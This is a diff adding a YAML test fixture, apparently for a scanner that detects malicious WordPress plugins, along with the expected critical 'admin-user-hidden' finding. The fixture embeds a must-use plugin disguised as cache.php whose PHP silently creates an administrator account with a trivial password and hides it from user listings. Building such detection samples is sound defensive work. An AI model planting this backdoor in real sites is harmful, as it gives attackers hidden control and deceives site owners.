@@ -1,0 +1,14 @@
+eco: wp-plugin
+note: 'rule mu-hidden-admin (Tuner positive): a shipped must-use plugin'
+new:
+  mu-plugins/cache.php: "<?php\nadd_action('init', function () {\n    if (!username_exists('wpsupport')) {\n   \
+    \     $id = wp_create_user('wpsupport', 'x', 'a@example.com');\n        (new WP_User($id))->set_role('administrator');\n\
+    \    }\n});\nadd_action('pre_user_query', function ($q) { $q->query_where .= \" AND user_login != 'wpsupport'\"\
+    ; });\n"
+meta_old:
+  ref:
+    version: 1.0.0
+features_old: []
+features_new: []
+expect:
+- {id: admin-user-hidden, min_severity: critical}
